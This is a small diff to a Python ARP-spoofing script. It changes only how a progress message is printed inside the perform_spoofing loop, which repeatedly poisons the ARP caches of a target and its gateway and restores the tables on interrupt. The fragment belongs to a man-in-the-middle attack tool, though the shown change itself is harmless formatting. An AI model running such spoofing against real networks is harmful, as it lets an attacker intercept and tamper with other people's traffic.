@@ -46,7 +46,7 @@ def perform_spoofing(target_ip, gateway_ip):
             spoof(target_ip, gateway_ip)
             spoof(gateway_ip, target_ip)
             sent_packets_count += 2
-            print("\r[+] Sending 2 packets regularly... Total packets sent: " + str(sent_packets_count), end="")
+            print("[+] Sending 2 packets regularly... Total packets sent: " + str(sent_packets_count), end="\r")
             time.sleep(2)
     except KeyboardInterrupt:
         print("\n[+] Execution aborted. Restoring ARP tables...")
